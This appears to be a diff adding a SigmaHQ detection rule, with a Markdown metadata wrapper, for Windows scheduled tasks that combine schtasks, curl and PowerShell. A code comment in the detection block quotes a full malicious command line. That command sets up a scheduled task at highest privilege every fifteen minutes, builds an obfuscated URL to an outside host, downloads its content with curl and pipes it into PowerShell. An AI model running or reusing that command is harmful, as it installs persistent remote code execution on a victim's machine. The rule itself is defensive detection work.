@@ -1,0 +1,75 @@
+---
+title: Scheduled Task Creation with Curl and PowerShell Execution Combo
+summary: |-
+  Detects the creation of a scheduled task using schtasks.exe, potentially in combination with curl for downloading payloads and PowerShell for executing them.
+  This facilitates executing malicious payloads or connecting with C&C server persistently without dropping the malware sample on the host.
+sigma_id: 1d174d38-8fda-4081-a9b6-56d9763c0cd8
+status: experimental
+level: medium
+platform: windows
+logsource: windows / process_creation
+tactics:
+  - TA0004
+  - TA0002
+  - TA0003
+  - TA0011
+techniques:
+  - T1053.005
+  - T1218
+  - T1105
+author: Swachchhanda Shrawan Poudel (Nextron Systems)
+date: '2025-02-05'
+falsepositives:
+  - Legitimate use of schtasks for administrative purposes.
+  - Automation scripts combining curl and PowerShell in controlled environments.
+references:
+  - https://tria.ge/241015-l98snsyeje/behavioral2
+source:
+  name: SigmaHQ
+  url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_schtasks_curl_and_powershell_combo.yml
+  license: DRL-1.1
+  license_url: https://github.com/SigmaHQ/Detection-Rule-License
+format: Sigma
+---
+
+```yaml
+title: Scheduled Task Creation with Curl and PowerShell Execution Combo
+id: 1d174d38-8fda-4081-a9b6-56d9763c0cd8
+status: experimental
+description: |
+    Detects the creation of a scheduled task using schtasks.exe, potentially in combination with curl for downloading payloads and PowerShell for executing them.
+    This facilitates executing malicious payloads or connecting with C&C server persistently without dropping the malware sample on the host.
+references:
+    - https://tria.ge/241015-l98snsyeje/behavioral2
+author: Swachchhanda Shrawan Poudel (Nextron Systems)
+date: 2025-02-05
+tags:
+    - attack.privilege-escalation
+    - attack.execution
+    - attack.persistence
+    - attack.stealth
+    - attack.t1053.005
+    - attack.t1218
+    - attack.command-and-control
+    - attack.t1105
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    # Example: cmd start /min /c schtasks /create /tn PolicyConverter /sc minute /mo 15 /tr "conhost --headless cmd /v:on /c set a=https&set b=inh&set c=ostne&set d=tservice.co&set e=!a!://www.!b!!c!!d!m& curl -o - !e!/mscu/lokc.php?wl=HGNBWBGW**Admin | powershell" /rl Highest
+    selection_img:
+        Image|endswith: '\schtasks.exe'
+        CommandLine|contains|windash: ' /create '
+    selection_curl:
+        CommandLine|contains|all:
+            - 'curl '
+            - 'http'
+            - '-o'
+    selection_powershell:
+        CommandLine|contains: 'powershell'
+    condition: all of selection_*
+falsepositives:
+    - Legitimate use of schtasks for administrative purposes.
+    - Automation scripts combining curl and PowerShell in controlled environments.
+level: medium
+```
